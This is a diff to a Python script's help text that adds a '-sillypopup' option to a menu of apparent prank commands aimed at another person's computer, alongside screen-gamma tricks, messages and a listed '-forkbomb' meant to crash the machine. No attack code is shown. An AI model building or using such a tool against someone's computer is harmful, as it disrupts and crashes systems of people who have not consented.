@@ -24,6 +24,7 @@ def main():
     "-darkbreathe": "Mimicks a breathing effect of the gamma values by making the screen darker",
     "-randomgamma": "Randomly changes the gamma value every second",
     "-sendmessage": "Sends the person a nice wee message of your choosing",
+    "-sillypopup": "Opens a specified number of pop ups on the persons screen",
     "-forkbomb": "If you want to be a real asshole and just crash their computer xD"}
 
     while not isEnd:
